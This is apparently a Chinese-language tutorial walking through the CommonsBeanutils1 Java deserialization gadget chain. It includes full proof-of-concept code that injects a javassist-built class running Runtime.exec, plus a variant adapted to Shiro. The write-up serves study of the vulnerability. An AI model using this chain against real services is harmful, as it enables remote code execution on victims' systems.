@@ -1,0 +1,272 @@
+  
+
+# CommonsBeanutils1（CB1链）
+
+## 说明
+
+PriorityQueue是优先队列，作用是保证每次取出的元素都是队列中权值最小的，这里涉及到了大小关系，元素大小的评判可以通过元素自身的自然顺序（使用默认的比较器），也可以通过构造时传入的比较器。
+
+BeanComparator 是比较器，用来比较两个bean的属性
+
+全篇建议一口气读完，不然看到后面忘记前面
+
+## 导入依赖
+
+  * commons-beanutils<1.9.2
+
+  * commons-collections<3.1
+
+  * commons-logging<1.2
+
+    
+    
+    <dependency>
+      <groupId>commons-beanutils</groupId>
+      <artifactId>commons-beanutils</artifactId>
+      <version>1.9.2</version>
+    </dependency>
+    <dependency>
+      <groupId>commons-collections</groupId>
+      <artifactId>commons-collections</artifactId>
+      <version>3.1</version>
+    </dependency>
+    <dependency>
+      <groupId>commons-logging</groupId>
+      <artifactId>commons-logging</artifactId>
+      <version>1.2</version>
+    </dependency>
+    
+    
+    PriorityQueue.readObject()  
+    PriorityQueue.heapify()  
+    PriorityQueue.siftDown()  
+    siftDownUsingComparator()  
+    BeanComparator.compare()  
+    TemplatesImpl.getOutputProperties()  
+    TemplatesImpl.newTransformer()  
+    TemplatesImpl.getTransletInstance()
+
+## 分析正文
+
+因为PriorityQueue实现了Serializable接口，重写了readObject方法，所以反序列化时会直接执行PriorityQueue的readObject方法，如果没有重写readObject方法的话，那么就会默认使用其父类的readObject方法，这里的queue和size是PriorityQueue的属性，size代表优先队列的大小，queue是队列里面的元素，这段代码的意思是从ObjectInputStream流中读一个整数值，然后当做数组的大小去创建queue数组，然后再从流中读取值依次赋给queue，点进去heapify函数
+
+![image-20220416130422496](https://image.3001.net/images/20220416/1650116115_625ac6136bdfcf3ad8241.png!small)
+
+readObject方法调用了heapify()方法，搞算法的都知道这个heapify()方法表达什么意思，我不搞，所以我不知道，但是不影响哈，传入siftDown函数的i是0，咱们进入siftDown方法继续往下看
+
+![image-20220416130843368](https://image.3001.net/images/20220416/1650116118_625ac6166a2a3918a3c6a.png!small)
+
+看到他又蛋疼的调用了一个方法，comparator是之前说的那个比较器，这里传入的参数为0和queue数组的第一个元素，然后进去siftDownUsingComparator(k,x);
+
+![1650433999_625f9fcf8b0d56dff8565.png!small?1650434000219](https://image.3001.net/images/20220420/1650433999_625f9fcf8b0d56dff8565.png!small?1650434000219)  
+
+来了啊，又是这种熟悉的>>>运算和<<运算，我也是看不懂，小问题，这里有两个compare方法，我们动调出了他的值，知道他肯定走了第二个compare，传入的x为queue数组的一个元素，c跟x一样，我们点进去看compare方法里有啥
+
+![image-20220416132607356](https://image.3001.net/images/20220416/1650116185_625ac659cca86c410e4ff.png!small)
+
+这里用的是BeanComparator的compare方法，这里其实就是拿到元素对应属性的值，注意他会调用类的getter方法去取值，这个property是BeanComparator的属性，property这个属性我们可以通过new这个BeanComparator类的时候指定他的值
+
+![image-20220416133557383](https://image.3001.net/images/20220416/1650116200_625ac6684a6d85d6b6199.png!small)
+
+所以property指定什么值好呢？这个property是queue数组中的一个元素的属性，所以我们应该往queue数组中存什么值？
+
+这里我们想到了TemplatesImpl这个类，因为他有一条利用链，这条利用链最终可以执行恶意代码，所以我们将TemplatesImpl存入queue数组，上图中的o1就是TemplatesImpl，这个类里有个属性叫_outputProperties，这个属性能触发利用链，所以这个property我们可以动态设置为outputProperties，接下来我们看看他的getter方法，
+
+![1650434040_625f9ff856513ac90c1f7.png!small?1650434041019](https://image.3001.net/images/20220420/1650434040_625f9ff856513ac90c1f7.png!small?1650434041019)
+
+这里调用了newTransformer()方法，点进去看
+
+![image-20220416135011460](https://image.3001.net/images/20220416/1650116265_625ac6a9d3ffdb94ffa1f.png!small)
+
+他new了一个TransformerImpl类，然后传入值getTransletInstance()，_outputProperties,
+
+_indentNumber,_tfactory，这四个值中的三个值是TransformerImpl的属性，然后我们点进去看getTransletInstance()里面写了啥
+
+![image-20220416135412389](https://image.3001.net/images/20220416/1650116336_625ac6f07652602d47578.png!small)
+
+然后我们点进去defineTransletClasses方法里，看看他写了啥
+
+![](https://image.3001.net/images/20220418/1650290168_625d6df863a8251649295.png!small)
+
+这个_bytecodes是TemplatesImpl这个类自带的属性，是个二位字节数组，每个元素就是一个字节数组，这个字节数组就代表了一个类，这段代码的意思就是从字节数组中创建对应的类，然后存放于_class属性中
+
+然后返回上一步
+
+![image-20220416135412389](https://image.3001.net/images/20220416/1650116336_625ac6f07652602d47578.png!small)
+
+这里通过newInstance去实例化_class属性中的每个Class类，然后调用默认的构造方法，我们可以创建一个恶意类，然后将这个恶意类转化为字节数组，然后将其填入_bytecode属性中，当实例化的时候就会调用我们恶意类中的恶意构造方法，从而达到RCE
+
+两条链接上。
+
+到此为止分析结束。
+
+让我们梳理一下，
+
+一步一步还原，一步一步序列化
+
+我们先构造一个恶意类，恶意类我们使用javassist编程可以动态创建
+
+    
+    
+    ClassPool pool = ClassPool.getDefault();//拿到默认ClassPool
+    CtClass payload = pool.makeClass("XClass");//创建一个恶意类，写入恶意类名
+    payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"))     payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
+    //makeClassInitializer()创建无参构造函数，然后在无参构造函数里写入恶意代码
+    byte[] evilClass = payload.toBytecode();
+
+为啥恶意类要继承AbstractTranslet，这个我舍友林总提醒了我一下，因为他在newInstance的时候强制类型转化了，如果不是这个AbstractTranslet的子类将会无法newInstance从而无法执行恶意代码
+
+![image-20220416151635308](https://image.3001.net/images/20220416/1650116560_625ac7d033018a75458ea.png!small)
+
+然后创建一个TemplateImpl对象，将这个恶意类塞进这个TemplateImpl对象的屁眼里
+
+    
+    
+    TemplatesImpl templates = new TemplatesImpl();  
+    setFieldValue(templates, "_bytecodes", new byte[][]{evilClass});  
+    setFieldValue(templates, "_name", "ZeanHike");  
+    setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());
+
+_name不能为空，前面的getTransletInstance()方法里如果name为空，会直接返回null，那就不能触发漏洞了，
+
+_tfactory也不能为空不然会报空指针引用
+
+![image-20220416153913025](https://image.3001.net/images/20220416/1650116622_625ac80e13a5af2e90904.png!small)
+
+然后创建一个序列化对象，也就是第一步说的PriorityQueue，因为他会触发接下来的利用链，
+
+    
+    
+    BeanComparator beanComparator = new BeanComparator();  
+    setFieldValue(beanComparator, "property", "outputProperties");  
+    PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
+
+这个queue就是序列化对象，为啥要传入一个beanComparator，就是为了确保前面这一步能走进这个siftUpUsingComparator(k,x)，利用链才能走通
+
+![1650434063_625fa00f8a5c8d6f33142.png!small?1650434064210](https://image.3001.net/images/20220420/1650434063_625fa00f8a5c8d6f33142.png!small?1650434064210)
+
+property属性是类BeanComparator的属性，所以要设置他的值为outputProperties，确保他能执行Templat
+esImpl.getOutputProperties()方法
+
+![image-20220416161406216](https://image.3001.net/images/20220416/1650116692_625ac854930b50ccf6d3d.png!small)
+
+然后设置值
+
+    
+    
+    setFieldValue(queue,"size",2);  
+    setFieldValue(queue, "queue", new Object[]{templates, templates});
+
+size一定要设置，他决定了创建出的queue数组的大小
+
+![1650434071_625fa017eeb040acbd5b9.png!small?1650434072684](https://image.3001.net/images/20220420/1650434071_625fa017eeb040acbd5b9.png!small?1650434072684)
+
+完整代码：
+
+    
+    
+    package com.ysoserial;  
+    ​  
+    ​  
+    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
+    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
+    import org.apache.commons.beanutils.BeanComparator;  
+    import org.apache.ibatis.javassist.ClassPool;  
+    import org.apache.ibatis.javassist.CtClass;  
+    import java.io.*;  
+    import java.lang.reflect.Field;  
+    import java.util.PriorityQueue;  
+    ​  
+    @SuppressWarnings({ "rawtypes", "unchecked" })  
+    public class CommonBeanUtils1 {  
+    ​  
+    ​  
+    // 修改值的方法，简化代码  
+    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception{  
+    Field field = object.getClass().getDeclaredField(fieldName);  
+    field.setAccessible(true);  
+    field.set(object, value);  
+    }  
+    public static void main(String[] args) throws Exception {  
+    // 创建恶意类，用于报错抛出调用链  
+    ClassPool pool = ClassPool.getDefault();  
+    CtClass payload = pool.makeClass("EvilClass");  
+    payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));  
+    //        payload.makeClassInitializer().setBody("new java.io.IOException().printStackTrace();");  
+    payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");  
+    byte[] evilClass = payload.toBytecode();  
+    // set field  
+    TemplatesImpl templates = new TemplatesImpl();  
+    setFieldValue(templates, "_bytecodes", new byte[][]{evilClass});  
+    setFieldValue(templates, "_name", "test");  
+    setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());  
+    // 创建序列化对象  
+    BeanComparator beanComparator = new BeanComparator();  
+    setFieldValue(beanComparator, "property", "outputProperties");  
+    PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);  
+    // 修改值  
+    setFieldValue(queue,"size",2);  
+    setFieldValue(queue, "queue", new Object[]{templates, templates});  
+    // 序列化  
+    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  
+    ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);  
+    objectOutputStream.writeObject(queue);  
+    byteArrayOutputStream.flush();  
+    byte[] bytes = byteArrayOutputStream.toByteArray();  
+    ​  
+    //反序列化  
+    ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);  
+    ObjectInputStream objectInputStream = new  
+    ObjectInputStream(byteArrayInputStream);  
+    objectInputStream.readObject();  
+    }  
+    }
+
+成功召唤出神兽
+
+![1650434084_625fa02463b55260744ca.png!small?1650434085692](https://image.3001.net/images/20220420/1650434084_625fa02463b55260744ca.png!small?1650434085692)
+
+## 扩展
+
+shiro只使用了一个commons-beanutils包，怎么使shiro也能利用这条CB1链？
+
+ysoserial依赖三个包，因为用到的BeanComparator类依赖commons-collection包中的ComparableComparator，
+
+![image-20220417100505983](https://image.3001.net/images/20220418/1650290430_625d6efea70631df60d9b.png!small)
+
+因为BeanComparator这个类的构造函数用到ComparableComparator![1650434092_625fa02cd345a91d5be4f.png!small?1650434093567](https://image.3001.net/images/20220420/1650434092_625fa02cd345a91d5be4f.png!small?1650434093567)
+
+而commons-collection组件又依赖commons-logging<1.2，所以只要在new一个BeanComparator类时，传入shiro自带的或者jdk自带的，或者commons-beanutils自带的，就不会去使用commons-collection组件和commons-logging<1.2组件
+
+![image-20220417101440381](https://image.3001.net/images/20220418/1650290495_625d6f3fd0cdbc312338e.png!small)
+
+所以这个比较器得满足三个条件
+
+  * 实现Serializable接口
+
+  * 实现Comparator接口
+
+  * 不在commons-collection包中
+
+在String包下找到了这个比较器CaseInsensitiveComparator
+
+![1650434105_625fa039021c685a2c962.png!small?1650434105772](https://image.3001.net/images/20220420/1650434105_625fa039021c685a2c962.png!small?1650434105772)
+
+在java.util.Collections包下也存在一个这样的比较器ReverseComparator
+
+![1650434115_625fa043de31b8ed2c27f.png!small?1650434116641](https://image.3001.net/images/20220420/1650434115_625fa043de31b8ed2c27f.png!small?1650434116641)
+
+第一个CaseInsensitiveComparator类的对象可以直接通过String.CASE_INSENSITIVE.ORDER拿到
+
+第二个ReverseComparator类的对象可以通过方法Collections.reverseOrder()拿到
+
+![1650434126_625fa04e0db6b8e287827.png!small?1650434126712](https://image.3001.net/images/20220420/1650434126_625fa04e0db6b8e287827.png!small?1650434126712)
+
+所以改造上面代码，在new一个BeanComparator时传入这两个参数其中之一即可
+
+    
+    
+    BeanComparator beanComparator = new BeanComparator(null, Collections.reverseOrder());  
+    或者  
+    BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORD)
+
